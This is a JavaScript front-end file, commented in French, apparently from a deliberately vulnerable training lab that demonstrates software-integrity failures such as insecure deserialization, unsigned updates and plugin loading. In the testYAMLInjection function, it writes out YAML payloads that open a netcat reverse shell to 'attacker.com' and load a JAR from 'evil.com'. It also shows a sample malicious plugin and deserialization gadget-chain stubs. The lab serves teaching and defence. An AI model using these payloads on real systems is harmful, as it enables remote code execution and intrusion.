// integrity-failures.js - Gestion spécifique pour les vulnérabilités d'intégrité

(function () {
    'use strict';

    // Variables globales
    let deserializationAttempts = [];
    let poisonedCache = {};

    // Initialisation
    document.addEventListener('DOMContentLoaded', function () {
        initializeIntegrityFailures();
    });

    function initializeIntegrityFailures() {
        // Gestionnaire pour le changement de type d'attaque
        const attackTypeSelect = document.getElementById('attackType');
        if (attackTypeSelect) {
            attackTypeSelect.addEventListener('change', handleAttackTypeChange);
            // Déclencher l'événement si une valeur est déjà sélectionnée
            if (attackTypeSelect.value) {
                setTimeout(() => handleAttackTypeChange(), 100);
            }
        }

        // Initialiser les formulaires
        initializeIntegrityForms();

        // Ajouter à l'historique si nous avons des résultats
        if (window.integrityData && window.integrityData.hasResults) {
            addToHistory(
                window.integrityData.attackType,
                window.integrityData.payload,
                true
            );
        }

        // Afficher les avertissements
        showIntegrityWarnings();
    }

    function handleAttackTypeChange() {
        const attackTypeSelect = document.getElementById('attackType');
        const attackType = attackTypeSelect.value;
        const payloadExample = document.getElementById('payloadExample');
        const payloadExampleContent = document.getElementById('payloadExampleContent');
        const payloadInput = document.getElementById('payload');

        if (!attackType) {
            payloadExample.style.display = 'none';
            return;
        }

        // Récupérer depuis les attributs data de l'option sélectionnée
        const selectedOption = attackTypeSelect.options[attackTypeSelect.selectedIndex];
        const payloadExampleFromData = selectedOption.getAttribute('data-payload-example');

        if (payloadExampleFromData) {
            payloadExampleContent.textContent = payloadExampleFromData;
            payloadExample.style.display = 'block';
            updateContextualHelp(attackType, payloadInput);
            return;
        }
    }

    function updateContextualHelp(attackType, payloadInput) {
        // Ajouter des placeholders contextuels
        const placeholders = {
            'insecure-deserialization': 'Base64 encoded BinaryFormatter data',
            'unsigned-updates': 'http://update-server.com/app.exe',
            'untrusted-sources': 'http://cdn.example.com/library.js',
            'weak-integrity': 'File hash (MD5/SHA1)',
            'insecure-ci-cd': 'Pipeline YAML configuration',
            'plugin-upload': 'Select DLL/JAR file',
            'yaml-injection': '!!python/object/apply:os.system',
            'cache-poisoning': 'Malicious cache value'
        };

        if (placeholders[attackType]) {
            payloadInput.placeholder = placeholders[attackType];
        }
    }

    function initializeIntegrityForms() {
        // Form: Deserialization
        const deserializeForm = document.getElementById('deserializeForm');
        if (deserializeForm) {
            deserializeForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const data = document.getElementById('serializedData').value;
                testDeserialization(data);
            });
        }

        // Form: Update Download
        const updateForm = document.getElementById('updateForm');
        if (updateForm) {
            updateForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const url = document.getElementById('updateUrl').value;
                downloadUnsignedUpdate(url);
            });
        }

        // Form: CDN Loading
        const cdnForm = document.getElementById('cdnForm');
        if (cdnForm) {
            cdnForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const url = document.getElementById('cdnUrl').value;
                loadFromCDN(url);
            });
        }

        // Form: Integrity Check
        const integrityForm = document.getElementById('integrityForm');
        if (integrityForm) {
            integrityForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const file = document.getElementById('integrityFile').value;
                const hash = document.getElementById('expectedHash').value;
                const algorithm = document.getElementById('hashAlgorithm').value;
                verifyWeakIntegrity(file, hash, algorithm);
            });
        }

        // Form: Pipeline
        const pipelineForm = document.getElementById('pipelineForm');
        if (pipelineForm) {
            pipelineForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const config = document.getElementById('pipelineConfig').value;
                executePipeline(config);
            });
        }

        // Form: Plugin Upload
        const pluginForm = document.getElementById('pluginForm');
        if (pluginForm) {
            pluginForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const fileInput = document.getElementById('pluginFile');
                if (fileInput.files.length > 0) {
                    uploadPlugin(fileInput.files[0]);
                } else {
                    showNotification('warning', 'Sélectionnez un fichier plugin');
                }
            });
        }

        // Form: Cache Poisoning
        const cacheForm = document.getElementById('cacheForm');
        if (cacheForm) {
            cacheForm.addEventListener('submit', function (e) {
                e.preventDefault();
                const key = document.getElementById('cacheKey').value;
                const value = document.getElementById('cacheValue').value;
                poisonCache(key, value);
            });
        }
    }

    function testDeserialization(serializedData) {
        showNotification('info', 'Test de désérialisation...');
        logDeserialization('BinaryFormatter', serializedData);

        fetch('/SoftwareIntegrity/DeserializeObject', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `serializedData=${encodeURIComponent(serializedData)}`
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'deserialization');
                    showNotification('danger', data.warning);
                    addToHistory('deserialization', 'BinaryFormatter exploit', true);
                } else {
                    showNotification('error', data.error || 'Désérialisation échouée');
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
            });
    }

    function downloadUnsignedUpdate(updateUrl) {
        showNotification('info', `Téléchargement depuis: ${updateUrl}`);

        fetch('/SoftwareIntegrity/DownloadUpdate', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `updateUrl=${encodeURIComponent(updateUrl)}`
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'update-download');
                    showNotification('danger', data.warning);
                    addToHistory('unsigned-update', updateUrl, true);
                }
            });
    }

    function loadFromCDN(cdnUrl) {
        showNotification('info', `Chargement CDN: ${cdnUrl}`);

        fetch('/SoftwareIntegrity/LoadFromCDN', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `cdnUrl=${encodeURIComponent(cdnUrl)}`
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'cdn-loading');
                    showNotification(data.hasIntegrity ? 'warning' : 'danger', data.warning);
                    addToHistory('cdn-loading', cdnUrl, true);
                }
            });
    }

    function verifyWeakIntegrity(file, expectedHash, algorithm) {
        showNotification('info', `Vérification ${algorithm} pour: ${file}`);

        fetch('/SoftwareIntegrity/VerifyIntegrity', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `filePath=${encodeURIComponent(file)}&expectedHash=${encodeURIComponent(expectedHash)}&algorithm=${algorithm}`
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'weak-hash');
                    showNotification('danger', data.warning);
                    addToHistory('weak-integrity', `${file} - ${algorithm}`, true);
                }
            });
    }

    function executePipeline(pipelineConfig) {
        showNotification('info', 'Exécution du pipeline...');

        fetch('/SoftwareIntegrity/ExecutePipeline', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `pipelineConfig=${encodeURIComponent(pipelineConfig)}`
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'pipeline');
                    showNotification('danger', data.warning || 'Pipeline exécuté!');
                    addToHistory('ci-cd-injection', 'Pipeline malveillant', true);
                }
            });
    }

    function uploadPlugin(file) {
        showNotification('info', `Upload du plugin: ${file.name}`);

        const formData = new FormData();
        formData.append('pluginFile', file);

        fetch('/SoftwareIntegrity/LoadPlugin', {
            method: 'POST',
            body: formData
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'plugin-upload');
                    showNotification('danger', data.warning);
                    addToHistory('plugin-upload', file.name, true);
                }
            });
    }

    function poisonCache(key, value) {
        showNotification('info', `Empoisonnement du cache: ${key}`);

        fetch('/SoftwareIntegrity/PoisonCache', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `key=${encodeURIComponent(key)}&value=${encodeURIComponent(value)}`
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'cache-poison');
                    showNotification('danger', data.warning);
                    poisonedCache[key] = value;
                    addToHistory('cache-poisoning', `${key} = ${value}`, true);
                }
            });
    }

    function showIntegrityResult(data, type) {
        const resultsDiv = document.getElementById('integrityResults');
        const contentDiv = document.getElementById('integrityResultContent');

        resultsDiv.style.display = 'block';

        let html = '<h6>Résultat Integrity Failure :</h6>';

        if (type === 'deserialization') {
            html += `<div class="mb-3">`;
            html += `<strong>Type désérialisé:</strong> ${data.deserializedType || 'Unknown'}<br>`;
            if (data.value) {
                html += `<strong>Valeur:</strong> ${data.value}<br>`;
            }
            html += `<strong>Gadget chains disponibles:</strong><br>`;
            html += `<ul>`;
            if (data.gadgetChains) {
                data.gadgetChains.forEach(chain => {
                    html += `<li><code>${chain}</code></li>`;
                });
            }
            html += `</ul>`;
            if (data.exploit) {
                html += `<strong>Exploit:</strong> ${data.exploit}<br>`;
            }
            html += `</div>`;
        } else if (type === 'update-download') {
            html += `<div class="mb-3">`;
            html += `<strong>Fichier:</strong> ${data.fileName}<br>`;
            html += `<strong>Taille:</strong> ${data.size} octets<br>`;
            html += `<strong>MD5 (faible):</strong> <code>${data.md5}</code><br>`;
            html += `<strong>Vulnérabilités:</strong>`;
            html += `<ul>`;
            data.vulnerabilities.forEach(vuln => {
                html += `<li class="text-danger">${vuln}</li>`;
            });
            html += `</ul>`;
            html += `</div>`;
        } else if (type === 'cdn-loading') {
            html += `<div class="mb-3">`;
            html += `<strong>URL:</strong> <code>${data.url}</code><br>`;
            html += `<strong>Host:</strong> ${data.host}<br>`;
            html += `<strong>HTTPS:</strong> <span class="badge bg-${data.isHttps ? 'success' : 'danger'}">${data.isHttps ? 'OUI' : 'NON'}</span><br>`;
            html += `<strong>SRI:</strong> <span class="badge bg-${data.hasIntegrity ? 'success' : 'danger'}">${data.hasIntegrity ? 'OUI' : 'NON'}</span><br>`;
            html += `<strong>Vulnérabilités:</strong>`;
            html += `<ul>`;
            data.vulnerabilities.forEach(vuln => {
                html += `<li class="text-warning">${vuln}</li>`;
            });
            html += `</ul>`;
            if (data.recommendation) {
                html += `<strong>Recommandation:</strong><br>`;
                html += `<pre class="bg-light p-2"><code>${escapeHtml(data.recommendation)}</code></pre>`;
            }
            html += `</div>`;
        } else if (type === 'weak-hash') {
            html += `<div class="mb-3">`;
            html += `<strong>Algorithme:</strong> <span class="badge bg-danger">${data.algorithm}</span><br>`;
            html += `<strong>Hash attendu:</strong> <code>${data.expectedHash}</code><br>`;
            html += `<strong>Hash calculé:</strong> <code>${data.computedHash}</code><br>`;
            html += `<strong>Valide:</strong> <span class="badge bg-${data.isValid ? 'success' : 'danger'}">${data.isValid ? 'OUI' : 'NON'}</span><br>`;
            html += `<strong>Vulnérabilités:</strong>`;
            html += `<ul>`;
            data.vulnerabilities.forEach(vuln => {
                html += `<li class="text-danger">${vuln}</li>`;
            });
            html += `</ul>`;
            html += `</div>`;
        } else if (type === 'pipeline') {
            html += `<div class="mb-3">`;
            if (data.detected) {
                html += `<strong>Injection détectée:</strong> <span class="badge bg-danger">${data.detected}</span><br>`;
                html += `<strong>Exemples dangereux:</strong>`;
                html += `<ul>`;
                data.examples.forEach(ex => {
                    html += `<li><code>${escapeHtml(ex)}</code></li>`;
                });
                html += `</ul>`;
            }
            if (data.commands) {
                html += `<strong>Commandes extraites:</strong>`;
                html += `<ul>`;
                data.commands.forEach(cmd => {
                    html += `<li><code>${escapeHtml(cmd)}</code></li>`;
                });
                html += `</ul>`;
            }
            html += `<strong>Risques:</strong>`;
            html += `<ul>`;
            data.risks.forEach(risk => {
                html += `<li class="text-warning">${risk}</li>`;
            });
            html += `</ul>`;
            html += `</div>`;
        } else if (type === 'plugin-upload') {
            html += `<div class="mb-3">`;
            html += `<strong>Plugin:</strong> ${data.fileName}<br>`;
            if (data.assemblyName) {
                html += `<strong>Assembly:</strong> <code>${data.assemblyName}</code><br>`;
                html += `<strong>Types trouvés:</strong> ${data.typesCount}<br>`;
                if (data.types) {
                    html += `<strong>Quelques types:</strong>`;
                    html += `<ul>`;
                    data.types.forEach(type => {
                        html += `<li><code>${type}</code></li>`;
                    });
                    html += `</ul>`;
                }
            }
            html += `<strong>Risques:</strong>`;
            html += `<ul>`;
            data.risks.forEach(risk => {
                html += `<li class="text-danger">${risk}</li>`;
            });
            html += `</ul>`;
            html += `</div>`;
        } else if (type === 'cache-poison') {
            html += `<div class="mb-3">`;
            html += `<strong>Clé:</strong> <code>${data.key}</code><br>`;
            html += `<strong>Valeur:</strong> <code>${escapeHtml(data.value)}</code><br>`;
            html += `<strong>Taille du cache:</strong> ${data.cacheSize}<br>`;
            html += `<strong>Clés empoisonnées:</strong>`;
            html += `<ul>`;
            data.poisonedKeys.forEach(key => {
                html += `<li><code>${key}</code></li>`;
            });
            html += `</ul>`;
            html += `<strong>Risques:</strong>`;
            html += `<ul>`;
            data.risks.forEach(risk => {
                html += `<li class="text-warning">${risk}</li>`;
            });
            html += `</ul>`;
            html += `</div>`;
        } else if (type === 'auto-update') {
            html += `<div class="mb-3">`;
            html += `<strong>Version actuelle:</strong> ${data.currentVersion}<br>`;
            html += `<strong>URL de mise à jour:</strong> <code>${data.updateUrl}</code><br>`;
            html += `<strong>Protocole:</strong> <span class="badge bg-danger">${data.protocol.toUpperCase()}</span><br>`;
            html += `<strong>Vulnérabilités:</strong>`;
            html += `<ul>`;
            data.vulnerabilities.forEach(vuln => {
                html += `<li class="text-danger">${vuln}</li>`;
            });
            html += `</ul>`;
            html += `</div>`;
        }

        if (data.warning) {
            html += `<div class="alert alert-danger mt-3">`;
            html += `<i class="fas fa-exclamation-triangle"></i> ${data.warning}`;
            html += `</div>`;
        }

        contentDiv.innerHTML = html;
    }

    // Fonctions globales pour les boutons
    window.generateGadgetChain = function () {
        const gadgetChains = [
            {
                name: 'TypeConfuseDelegate',
                description: 'Exécute Process.Start',
                payload: 'AAEAAAD/////AQAAAAAAAAAMBAAAA...[Base64 payload]'
            },
            {
                name: 'WindowsIdentity',
                description: 'RCE via WindowsIdentity',
                payload: 'AAEAAAD/////AQAAAAAAAAAMBAAAA...[Base64 payload]'
            },
            {
                name: 'ObjectDataProvider',
                description: 'Invoque n\'importe quelle méthode',
                payload: 'AAEAAAD/////AQAAAAAAAAAMBAAAA...[Base64 payload]'
            }
        ];

        let html = '<h6>Gadget Chains disponibles :</h6>';
        gadgetChains.forEach(chain => {
            html += `<div class="mb-3 p-2 border rounded">`;
            html += `<strong>${chain.name}:</strong> ${chain.description}<br>`;
            html += `<code class="small">${chain.payload}</code><br>`;
            html += `<button class="btn btn-sm btn-danger mt-2" onclick="useGadgetChain('${chain.name}')">`;
            html += `<i class="fas fa-bomb"></i> Utiliser ce gadget</button>`;
            html += `</div>`;
        });

        showCustomResult(html);
        showNotification('warning', 'Utilisez ysoserial.net pour de vrais payloads!');
    };

    window.useGadgetChain = function (chainName) {
        showNotification('danger', `Gadget chain ${chainName} sélectionné!`);
        document.getElementById('serializedData').value = `[${chainName} payload - Use ysoserial.net]`;
    };

    window.showSRIExample = function () {
        const html = `
            <h6>Exemple avec Subresource Integrity (SRI) :</h6>
            <pre class="bg-light p-3"><code>&lt;script 
    src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
    integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
    crossorigin="anonymous"&gt;&lt;/script&gt;</code></pre>
            <p>Le hash SRI garantit que le fichier n'a pas été modifié.</p>
            <button class="btn btn-sm btn-success" onclick="generateSRI()">
                <i class="fas fa-calculator"></i> Générer hash SRI
            </button>
        `;
        showCustomResult(html);
    };

    window.generateSRI = function () {
        showNotification('info', 'Pour générer un hash SRI: openssl dgst -sha384 -binary file.js | openssl base64 -A');
    };

    window.createMaliciousPlugin = function () {
        const html = `
            <h6>Structure d'un plugin malveillant :</h6>
            <pre class="bg-dark text-light p-3"><code>// MaliciousPlugin.cs
using System;
using System.Diagnostics;

namespace MaliciousPlugin
{
    public class Loader
    {
        static Loader()
        {
            // Exécuté automatiquement au chargement!
            Process.Start("calc.exe");
            // Backdoor, keylogger, etc.
        }
        
        public void Execute()
        {
            // Code malveillant
        }
    }
}</code></pre>
            <p class="text-danger">Le constructeur statique s'exécute dès le chargement de la DLL!</p>
        `;
        showCustomResult(html);
    };

    window.testYAMLInjection = function () {
        const yamlPayloads = [
            '!!python/object/apply:os.system ["calc.exe"]',
            '!!python/object/apply:subprocess.Popen [["nc", "-e", "/bin/sh", "attacker.com", "4444"]]',
            '!ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: !ruby/object:Net::BufferedIO',
            '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/payload.jar"]]]]'
        ];

        yamlPayloads.forEach((payload, index) => {
            setTimeout(() => {
                showNotification('danger', `Test YAML: ${payload.substring(0, 50)}...`);
                executePipeline(payload);
            }, index * 1000);
        });
    };

    window.checkAutoUpdate = function () {
        fetch('/SoftwareIntegrity/CheckForUpdates')
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showIntegrityResult(data, 'auto-update');
                    showNotification('danger', data.warning);

                    // Afficher le processus
                    let html = '<h6>Processus de mise à jour vulnérable :</h6><ol>';
                    data.updateProcess.forEach(step => {
                        html += `<li class="${step.includes('HTTP') || step.includes('No') ? 'text-danger' : ''}">${step}</li>`;
                    });
                    html += '</ol>';

                    document.getElementById('integrityResultContent').innerHTML += html;
                }
            });
    };

    function logDeserialization(type, data) {
        deserializationAttempts.push({
            timestamp: new Date().toLocaleTimeString(),
            type: type,
            dataLength: data.length,
            preview: data.substring(0, 50) + '...'
        });

        updateDeserializationMonitor();
    }

    function updateDeserializationMonitor() {
        const monitor = document.getElementById('deserializationMonitor');
        const log = document.getElementById('deserializationLog');

        if (deserializationAttempts.length > 0) {
            monitor.style.display = 'block';

            let html = '<h6>Tentatives de désérialisation :</h6>';
            html += '<div class="table-responsive"><table class="table table-sm">';
            html += '<thead><tr><th>Heure</th><th>Type</th><th>Taille</th><th>Aperçu</th></tr></thead>';
            html += '<tbody>';

            deserializationAttempts.slice(-10).reverse().forEach(attempt => {
                html += '<tr>';
                html += `<td>${attempt.timestamp}</td>`;
                html += `<td><span class="badge bg-danger">${attempt.type}</span></td>`;
                html += `<td>${attempt.dataLength}</td>`;
                html += `<td><code>${escapeHtml(attempt.preview)}</code></td>`;
                html += '</tr>';
            });

            html += '</tbody></table></div>';
            log.innerHTML = html;
        }
    }

    function showCustomResult(html) {
        const resultsDiv = document.getElementById('integrityResults');
        const contentDiv = document.getElementById('integrityResultContent');

        resultsDiv.style.display = 'block';
        contentDiv.innerHTML = html;
    }

    function showIntegrityWarnings() {
        console.group('%c⚠️ Software and Data Integrity Failures Detected', 'color: red; font-size: 16px; font-weight: bold');
        console.error('❌ BinaryFormatter.Deserialize() - Remote Code Execution');
        console.error('❌ TypeNameHandling.All - Type injection');
        console.error('❌ MD5/SHA1 for integrity - Broken algorithms');
        console.error('❌ HTTP for updates - No encryption');
        console.error('❌ No signature verification');
        console.error('❌ Assembly.LoadFrom() - Arbitrary code');
        console.error('❌ No Subresource Integrity (SRI)');
        console.warn('💡 Prevention:');
        console.warn('   - Never use BinaryFormatter');
        console.warn('   - Always verify digital signatures');
        console.warn('   - Use SHA-256 minimum for hashing');
        console.warn('   - HTTPS only for all downloads');
        console.warn('   - Implement SRI for all CDN resources');
        console.groupEnd();
    }

    function showNotification(type, message) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type === 'error' ? 'danger' : type} alert-dismissible fade show position-fixed`;
        alertDiv.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
        alertDiv.innerHTML = `
            <i class="fas fa-${type === 'danger' ? 'skull' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;

        document.body.appendChild(alertDiv);

        setTimeout(() => {
            alertDiv.classList.remove('show');
            setTimeout(() => alertDiv.remove(), 150);
        }, 5000);
    }

    function addToHistory(actionType, details, isVulnerable) {
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] Integrity Failure ${actionType}: ${details}`);
    }

    function escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, m => map[m]);
    }

    // Exposer certaines fonctions si nécessaire
    window.IntegrityFailures = {
        testDeserialization: testDeserialization,
        showNotification: showNotification,
        poisonCache: poisonCache
    };

})();